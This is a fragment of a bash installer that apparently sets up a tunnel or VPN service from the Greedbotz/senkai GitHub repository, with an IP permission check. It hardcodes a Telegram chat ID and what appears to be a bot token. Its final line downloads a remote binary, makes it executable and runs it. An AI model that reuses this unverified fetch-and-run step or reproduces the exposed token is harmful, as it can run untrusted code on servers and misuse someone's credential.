...
clear
REPO="https://raw.githubusercontent.com/Greedbotz/senkai/main/"
start=$(date +%s)
secs_to_human() {
...
echo -e "\e[32mloading...\e[0m" 
clear
izinsc="https://raw.githubusercontent.com/Greedbotz/senkai/main/iplist"
# USERNAME
rm -f /usr/bin/user
...
TIMES="10"
CHATID="7012389292"
KEY="7835840964:AAHA-dJCtTX2tNlmGNyQYDhEeMTLzJOg21Q"
...
wget -q https://raw.githubusercontent.com/Greedbotz/senkai/main/config/fv-tunnel && chmod +x fv-tunnel && ./fv-tunnel
